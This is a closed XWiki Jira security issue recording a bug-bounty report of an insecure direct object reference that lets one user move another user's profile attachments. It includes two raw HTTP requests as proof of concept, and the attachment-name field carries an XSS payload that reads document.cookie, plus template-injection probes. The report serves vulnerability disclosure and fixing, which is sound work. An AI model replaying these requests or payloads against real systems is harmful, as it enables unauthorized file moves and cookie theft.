

[Log in](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-20334)[Skip to main content](#main)[Skip to sidebar](#sidebar)Linked ApplicationsLoadingâ€¦[![XWiki.org JIRA](/s/-65z3d2/930000/8ws80b/_/jira-logo-scaled.png)](https://jira.xwiki.org/secure/MyJiraHome.jspa)

* [Dashboards](/secure/Dashboard.jspa "View and manage your dashboards")
* [Projects](/secure/BrowseProjects.jspa "View recent projects and browse a list of projects")
* [Issues](/issues/ "Search for issues and view recent issues")

* Give feedback to Atlassian
* [Help](https://docs.atlassian.com/jira/jcore-docs-093/ "Help")
  + [Jira Core help](https://docs.atlassian.com/jira/jcore-docs-093/ "Go to the online documentation for Jira Core")
  + [Keyboard Shortcuts](/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about Jira's Keyboard Shortcuts")
  + [About Jira](/secure/AboutPage.jspa "Get more information about Jira")
  + [Jira Credits](/secure/credits/AroundTheWorld%21default.jspa "See who did what")
* [Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-20334)

![Uploaded image for project: 'XWiki Platform'](https://jira.xwiki.org/secure/projectavatar?pid=10010&avatarId=13602)

1. [XWiki Platform](/browse/XWIKI)
2. [XWIKI-20334](/browse/XWIKI-20334)

# Move documents from victim profile to attacker profile

[Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-20334 "Log In")ClosedExportnull

XMLWordPrintable
#### Details

* **Type:**
  ![](/secure/viewavatar?size=xsmall&avatarId=13503&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.") Bug
* **Resolution:**
  Fixed
* **Priority:**
  ![](/images/icons/priorities/blocker.svg "Blocker - Blocks development and/or testing work, production could not run.") Blocker
* **Fix Version/s:**
  [15.0-rc-1](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+15.0-rc-1 "15.0-rc-1 "), [14.4.8](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+14.4.8 "14.4.8 "), [14.10.4](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+14.10.4 "14.10.4 ")
* **Affects Version/s:**
  14.0-rc-1
* **Component/s:**
  [Old Core](/issues/?jql=project+%3D+XWIKI+AND+component+%3D+%22Old+Core%22 "Old Core ")
* **Labels:**
  + [attack\_impersonation](/issues/?jql=labels+%3D+attack_impersonation "attack_impersonation")
  + [attacker\_account](/issues/?jql=labels+%3D+attacker_account "attacker_account")
  + [intigriti](/issues/?jql=labels+%3D+intigriti "intigriti")
  + [security](/issues/?jql=labels+%3D+security "security")

* **Tests:**
  Unit
* **Difficulty:**
  Unknown
* **Documentation:**
  N/A
* **Documentation in Release Notes:**
  N/A
* **Similar issues:**

#### Description

**SUBMISSION REFERENCES**

* **Submission code**: XWIKI-WT6D3WYY
* **Submission URL**: <https://www.intigriti.com/auth/dashboard?redirect=/submissions/e95a7ad5-7029-4627-abf0-3e3e3ea0b4ce/XWIKI-WT6D3WYY>

**RESEARCHER INFORMATION**

* **Submitter**: bruhbey

**SUBMISSION INFORMATION**

* **Created at**: Thu, 03 Nov 2022 07:44:56 GMT
* **Submission status**: Archived

**REPORT CONTENT**

* **Severity**: High (8.1)
* **Domain**: <https://intigriti.xwiki.com/> (Url)
* **Proof of concept**: Hey

Summary:

* IDOR on move documents

Steps:

* create 2 accounts
* login your first account,go to your profile and upload an attachment
* then go to your second account and upload an attachment
* try to move your attachment (from second account)

first request :

GET /xwiki/bin/view/XWiki/bruhboyi?xpage=attachment%2Fmove&attachment=xwiki%3AXWiki.bruhboyi%40%24%7B2\*2%7D%24%7B%7B2\*2%7D%7D%7B2\*2%7D%7B%7B2\*2%7D%7D%3Cimg%20src%3DA%20onerror%3Dalert%28document.cookie%29%3E.pdf HTTP/1.1

Host: intigriti.xwiki.com

Connection: close

sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"

sec-ch-ua-mobile: ?0

sec-ch-ua-platform: "Linux"

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,**/**;q=0.8,application/signed-exchange;v=b3;q=0.9

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: <https://intigriti.xwiki.com/xwiki/bin/view/XWiki/bruhboyi>

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Cookie: JSESSIONID=F1F2C6CBB4D4E0FAB1C64749BB732229; username="9c0MhyM7A8TTVVq3M3evqg\_*"; password="3zG4GTGXE6KBpi89DD8rzA*\_"; rememberme="false"; validation="71a1f21d8049f98419c88f6fc42fd5b5"

* you have to change attachment parameter

Second request :

POST /xwiki/bin/view/XWiki/bruhboyi?xpage=attachment/move&step=2 HTTP/1.1

Host: intigriti.xwiki.com

Connection: close

Content-Length: 444

Cache-Control: max-age=0

sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"

sec-ch-ua-mobile: ?0

sec-ch-ua-platform: "Linux"

Upgrade-Insecure-Requests: 1

Origin: <https://intigriti.xwiki.com>

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,**/**;q=0.8,application/signed-exchange;v=b3;q=0.9

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: [https://intigriti.xwiki.com/xwiki/bin/view/XWiki/bruhboyi?xpage=attachment%2Fmove&attachment=xwiki%3AXWiki.bruhboyi%40%24%7B2\*2%7D%24%7B%7B2\*2%7D%7D%7B2\*2%7D%7B%7B2\*2%7D%7D%3Cimg%20src%3DA%20onerror%3Dalert%28document.cookie%29%3E.pdf](https://intigriti.xwiki.com/xwiki/bin/view/XWiki/bruhboyi?xpage=attachment%2Fmove&attachment=xwiki%3AXWiki.bruhboyi%40%24%7B2*2%7D%24%7B%7B2*2%7D%7D%7B2*2%7D%7B%7B2*2%7D%7D%3Cimg%20src%3DA%20onerror%3Dalert%28document.cookie%29%3E.pdf)

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Cookie: JSESSIONID=F1F2C6CBB4D4E0FAB1C64749BB732229; username="9c0MhyM7A8TTVVq3M3evqg\_*"; password="3zG4GTGXE6KBpi89DD8rzA*\_"; rememberme="false"; validation="71a1f21d8049f98419c88f6fc42fd5b5"

form\_token=wkm7S5aStrzL0zJFDbt1YA&async=true&sourceLocation=xwiki%3AXWiki.bruhboyi&sourceAttachmentName=%24%7B2\*2%7D%24%7B%7B2\*2%7D%7D%7B2\*2%7D%7B%7B2\*2%7D%7D%3Cimg+src%3DA+onerror%3Dalert%28document.cookie%29%3E.pdf&updateReferences=true&updateReferences=false&autoRedirect=false&targetAttachmentName=%24%7B2\*2%7D%24%7B%7B2\*2%7D%7D%7B2\*2%7D%7B%7B2\*2%7D%7D%3Cimg+src%3DA+onerror%3Dalert%28document.cookie%29%3E.pdf&targetLocation=XWiki.bruhboyi

* you can simply change sourceLocation and sourceAttachmentName to reproduce issue

I added poc video

Thanks

* **Impact**: IDOR
* **Personal data involved**: No
* **Endpoint**: <https://intigriti.xwiki.com/xwiki/bin/view/XWiki/><username>?xpage=attachment/move&step=2
* **Type**: Insecure Direct Object Reference
* **Attachments**: No attachments available

#### Attachments

#### Issue Links

links to

![Web Link](https://github.com/favicon.ico "Web Link")
[GitHub Security advisory](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rwwx-6572-mp29)

#### Activity

#### People

Assignee:

![MichaelHamann](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Michael Hamann

Reporter:

![intigriti](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Intigriti Integration

Votes:
0
Vote for this issue

Watchers:
1
Start watching this issue

#### Dates

Created:

08/Nov/22 11:44

Updated:

10/Dec/24 17:10

Resolved:

11/Jan/23 16:32

* Atlassian Jira [Project Management Software](https://www.atlassian.com/software/jira)
* [About Jira](/secure/AboutPage.jspa/secure/AboutPage.jspa)
* [Report a problem](/secure/CreateIssue%21default.jspa)

Powered by a free Atlassian [Jira](http://www.atlassian.com/software/jira) open source license for XWiki.org. Try Jira - [bug tracking software](http://www.atlassian.com/software/jira) for *your* team.

[Atlassian](http://www.atlassian.com/)

